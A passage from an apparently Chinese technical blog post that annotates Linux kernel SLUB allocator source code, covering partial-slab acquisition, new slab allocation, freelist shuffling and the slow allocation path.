遍历kmem_cache_node-&gt;partial尝试获取.</span></span><br><span class="line"><span class="comment"> * Try to allocate a partial slab from a specific node.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">get_partial_node</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="keyword">struct</span> kmem_cache_node *n,</span></span><br><span class="line"><span class="params">      <span class="keyword">struct</span> partial_context *pc)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>, *<span class="title">slab2</span>;</span></span><br><span class="line"><span class="type">void</span> *object = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> partial_slabs = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Racy check. If we mistakenly see no partial slabs then we</span></span><br><span class="line"><span class="comment"> * just allocate an empty slab. If we mistakenly try to get a</span></span><br><span class="line"><span class="comment"> * partial slab and there is none available then get_partial()</span></span><br><span class="line"><span class="comment"> * will return NULL.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!n || !n-&gt;nr_partial)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">spin_lock_irqsave(&amp;n-&gt;list_lock, flags);</span><br><span class="line">list_for_each_entry_safe(slab, slab2, &amp;n-&gt;partial, slab_list) {</span><br><span class="line"><span class="type">void</span> *t;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!pfmemalloc_match(slab, pc-&gt;flags))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ENABLED(CONFIG_SLUB_TINY) || kmem_cache_debug(s)) {</span><br><span class="line">object = alloc_single_from_partial(s, n, slab,</span><br><span class="line">pc-&gt;orig_size);</span><br><span class="line"><span class="keyword">if</span> (object)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">t = acquire_slab(s, n, slab, object == <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (!t)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!object) {</span><br><span class="line">*pc-&gt;slab = slab;</span><br><span class="line">stat(s, ALLOC_FROM_PARTIAL);</span><br><span class="line">object = t;</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">put_cpu_partial(s, slab, <span class="number">0</span>);</span><br><span class="line">stat(s, CPU_PARTIAL_NODE);</span><br><span class="line">partial_slabs++;</span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line"><span class="keyword">if</span> (!kmem_cache_has_cpu_partial(s)</span><br><span class="line">|| partial_slabs &gt; s-&gt;cpu_partial_slabs / <span class="number">2</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">}</span><br><span class="line">spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 将slab从kmem_cache_node-&gt;partial中移除.</span></span><br><span class="line"><span class="comment"> * 设置为full状态并冻结该slab,返回slab-&gt;freelist.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> *<span class="title function_">acquire_slab</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> kmem_cache_node *n, <span class="keyword">struct</span> slab *slab,</span></span><br><span class="line"><span class="params"><span class="type">int</span> mode)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">void</span> *freelist;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> counters;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> <span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">lockdep_assert_held(&amp;n-&gt;list_lock);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Zap the freelist and set the frozen bit.</span></span><br><span class="line"><span class="comment"> * The old freelist is the list of objects for the</span></span><br><span class="line"><span class="comment"> * per cpu allocation list.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">freelist = slab-&gt;freelist;</span><br><span class="line">counters = slab-&gt;counters;</span><br><span class="line">new.counters = counters;</span><br><span class="line"><span class="keyword">if</span> (mode) {</span><br><span class="line">new.inuse = slab-&gt;objects;</span><br><span class="line">new.freelist = <span class="literal">NULL</span>;</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">new.freelist = freelist;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">VM_BUG_ON(new.frozen);</span><br><span class="line">new.frozen = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!__slab_update_freelist(s, slab,</span><br><span class="line">freelist, counters,</span><br><span class="line">new.freelist, new.counters,</span><br><span class="line"><span class="string">"acquire_slab"</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">remove_partial(n, slab);</span><br><span class="line">WARN_ON(!freelist);</span><br><span class="line"><span class="keyword">return</span> freelist;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> slab *<span class="title function_">new_slab</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">gfp_t</span> flags, <span class="type">int</span> node)</span></span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span> (unlikely(flags &amp; GFP_SLAB_BUG_MASK))</span><br><span class="line">flags = kmalloc_fix_flags(flags);</span><br><span class="line"></span><br><span class="line">WARN_ON_ONCE(s-&gt;ctor &amp;&amp; (flags &amp; __GFP_ZERO));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> allocate_slab(s,</span><br><span class="line">flags &amp; (GFP_RECLAIM_MASK | GFP_CONSTRAINT_MASK), node);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>核心的分配slab的过程在allocate_slab中实现.<br>向底层buddy system请求连续页面作为slab,根据请求对slab以及slab-&gt;freelist进行初始化.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> slab *<span class="title function_">allocate_slab</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="type">gfp_t</span> flags, <span class="type">int</span> node)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span> =</span> s-&gt;oo;</span><br><span class="line"><span class="type">gfp_t</span> alloc_gfp;</span><br><span class="line"><span class="type">void</span> *start, *p, *next;</span><br><span class="line"><span class="type">int</span> idx;</span><br><span class="line"><span class="type">bool</span> shuffle;</span><br><span class="line"></span><br><span class="line">flags &amp;= gfp_allowed_mask;</span><br><span class="line"></span><br><span class="line">flags |= s-&gt;allocflags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Let the initial higher-order allocation fail under memory pressure</span></span><br><span class="line"><span class="comment"> * so we fall-back to the minimum order allocation.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">alloc_gfp = (flags | __GFP_NOWARN | __GFP_NORETRY) &amp; ~__GFP_NOFAIL;</span><br><span class="line"><span class="keyword">if</span> ((alloc_gfp &amp; __GFP_DIRECT_RECLAIM) &amp;&amp; oo_order(oo) &gt; oo_order(s-&gt;min))</span><br><span class="line">alloc_gfp = (alloc_gfp | __GFP_NOMEMALLOC) &amp; ~__GFP_RECLAIM;</span><br><span class="line"></span><br><span class="line">slab = alloc_slab_page(alloc_gfp, node, oo);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!slab)) {</span><br><span class="line">oo = s-&gt;min;</span><br><span class="line">alloc_gfp = flags;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Allocation may have failed due to fragmentation.</span></span><br><span class="line"><span class="comment"> * Try a lower order alloc if possible</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">slab = alloc_slab_page(alloc_gfp, node, oo);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!slab))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">stat(s, ORDER_FALLBACK);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">slab-&gt;objects = oo_objects(oo);</span><br><span class="line">slab-&gt;inuse = <span class="number">0</span>;</span><br><span class="line">slab-&gt;frozen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">account_slab(slab, oo_order(oo), s, flags);</span><br><span class="line"></span><br><span class="line">slab-&gt;slab_cache = s;</span><br><span class="line"></span><br><span class="line">kasan_poison_slab(slab);</span><br><span class="line"></span><br><span class="line">start = slab_address(slab);</span><br><span class="line"></span><br><span class="line">setup_slab_debug(s, slab, start);</span><br><span class="line"></span><br><span class="line"><span class="comment">//CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line">shuffle = shuffle_freelist(s, slab);</span><br><span class="line"><span class="comment">//如果没开就从低地址向高地址串成链表</span></span><br><span class="line"><span class="keyword">if</span> (!shuffle) {</span><br><span class="line">start = fixup_red_left(s, start);</span><br><span class="line">start = setup_object(s, start);</span><br><span class="line">slab-&gt;freelist = start;</span><br><span class="line"><span class="keyword">for</span> (idx = <span class="number">0</span>, p = start; idx &lt; slab-&gt;objects - <span class="number">1</span>; idx++) {</span><br><span class="line">next = p + s-&gt;size;</span><br><span class="line">next = setup_object(s, next);</span><br><span class="line">set_freepointer(s, p, next);</span><br><span class="line">p = next;</span><br><span class="line">}</span><br><span class="line">set_freepointer(s, p, <span class="literal">NULL</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> slab;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Slab allocation and freeing</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> slab *<span class="title function_">alloc_slab_page</span><span class="params">(<span class="type">gfp_t</span> flags, <span class="type">int</span> node,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> kmem_cache_order_objects oo)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">folio</span> *<span class="title">folio</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> order = oo_order(oo);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (node == NUMA_NO_NODE)</span><br><span class="line">folio = (<span class="keyword">struct</span> folio *)alloc_pages(flags, order);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">folio = (<span class="keyword">struct</span> folio *)__alloc_pages_node(node, flags, order);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!folio)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">slab = folio_slab(folio);</span><br><span class="line">__folio_set_slab(folio);</span><br><span class="line"><span class="comment">/* Make the flag visible before any changes to folio-&gt;mapping */</span></span><br><span class="line">smp_wmb();</span><br><span class="line"><span class="keyword">if</span> (folio_is_pfmemalloc(folio))</span><br><span class="line">slab_set_pfmemalloc(slab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> slab;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>对于开启了CONFIG_SLAB_FREELIST_RANDOM,shuffle_freelist会打乱freelist的顺序.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Shuffle the single linked freelist based on a random pre-computed sequence */</span></span><br><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">shuffle_freelist</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s, <span class="keyword">struct</span> slab *slab)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">void</span> *start;</span><br><span class="line"><span class="type">void</span> *cur;</span><br><span class="line"><span class="type">void</span> *next;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> idx, pos, page_limit, freelist_count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (slab-&gt;objects &lt; <span class="number">2</span> || !s-&gt;random_seq)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">freelist_count = oo_objects(s-&gt;oo);</span><br><span class="line">pos = get_random_u32_below(freelist_count);</span><br><span class="line"></span><br><span class="line">page_limit = slab-&gt;objects * s-&gt;size;</span><br><span class="line">start = fixup_red_left(s, slab_address(slab));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* First entry is used as the base of the freelist */</span></span><br><span class="line">cur = next_freelist_entry(s, slab, &amp;pos, start, page_limit,</span><br><span class="line">freelist_count);</span><br><span class="line">cur = setup_object(s, cur);</span><br><span class="line">slab-&gt;freelist = cur;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (idx = <span class="number">1</span>; idx &lt; slab-&gt;objects; idx++) {</span><br><span class="line">next = next_freelist_entry(s, slab, &amp;pos, start, page_limit,</span><br><span class="line">freelist_count);</span><br><span class="line">next = setup_object(s, next);</span><br><span class="line">set_freepointer(s, cur, next);</span><br><span class="line">cur = next;</span><br><span class="line">}</span><br><span class="line">set_freepointer(s, cur, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="check-new-slab"><a href="#check-new-slab" class="headerlink" title="check_new_slab"></a>check_new_slab</h4><p>一些check.检查slab和标志位是否匹配,若不匹配则将其deactivate</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">check_new_slab:</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (kmem_cache_debug(s)) {</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For debug caches here we had to go through</span></span><br><span class="line"><span class="comment"> * alloc_single_from_partial() so just store the tracking info</span></span><br><span class="line"><span class="comment"> * and return the object</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (s-&gt;flags &amp; SLAB_STORE_USER)</span><br><span class="line">set_track(s, freelist, TRACK_ALLOC, addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> freelist;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!pfmemalloc_match(slab, gfpflags))) {</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For !pfmemalloc_match() case we don't load freelist so that</span></span><br><span class="line"><span class="comment"> * we don't make further mismatched allocations easier.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">deactivate_slab(s, slab, get_freepointer(s, freelist));</span><br><span class="line"><span class="keyword">return</span> freelist;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="retry-load-slab"><a href="#retry-load-slab" class="headerlink" title="retry_load_slab"></a>retry_load_slab</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* 再次尝试装载slab,如果kmem_cache_cpu上已经有</span></span><br><span class="line"><span class="comment">* slab了(并发问题),进行deactivate直到成功装载</span></span><br><span class="line"><span class="comment">* 新的slab</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">retry_load_slab:</span><br><span class="line"></span><br><span class="line">local_lock_irqsave(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"><span class="keyword">if</span> (unlikely(c-&gt;slab)) {</span><br><span class="line"><span class="type">void</span> *flush_freelist = c-&gt;freelist;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">flush_slab</span> =</span> c-&gt;slab;</span><br><span class="line"></span><br><span class="line">c-&gt;slab = <span class="literal">NULL</span>;</span><br><span class="line">c-&gt;freelist = <span class="literal">NULL</span>;</span><br><span class="line">c-&gt;tid = next_tid(c-&gt;tid);</span><br><span class="line"></span><br><span class="line">local_unlock_irqrestore(&amp;s-&gt;cpu_slab-&gt;lock, flags);</span><br><span class="line"></span><br><span class="line">deactivate_slab(s, flush_slab, flush_freelist);</span><br><span class="line"></span><br><span class="line">stat(s, CPUSLAB_FLUSH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span> retry_load_slab;</span><br><span class="line">}</span><br><span class="line">c-&gt;slab = slab;</span><br><span class="line"></span><br><span class="line"><span class="keyword">goto</span> load_freelist;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="完整回顾"><a href="#完整回顾" class="headerlink" title="完整回顾"></a>完整回顾</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *___slab_alloc(<span class="keyword">struct</span> kmem_cache *s, <span class="type">gfp_t</span> gfpflags, <span class="type">int</span> node,</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> addr, <span class="keyword">struct</span> kmem_cache_cpu *c, <span class="type">unsigned</span> <span class="type">int</span> orig_size)</span><br><span class="line">{</span><br><span class="line"><span class="type">void</span> *freelist;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">partial_context</span> <span class="title">pc</span>;</span></span><br><span class="line"></span><br><span class="line">stat(s, ALLOC_SLOWPATH);</span><br><span class="line"></span><br><span class="line"><span class="comment">//读取c-&gt;slab到局部变量中,便于访问修改</span></span><br><span class="line">reread_slab:</span><br><span class="line"></span><br><span class="line">slab = READ_ONCE(c-&gt;slab);</span><br><span class="line"><span class="keyword">if</span> (!slab) {</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * if the node is not online or has no normal memory, just</span></span><br><span class="line"><span class="comment"> * ignore the node constraint</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span 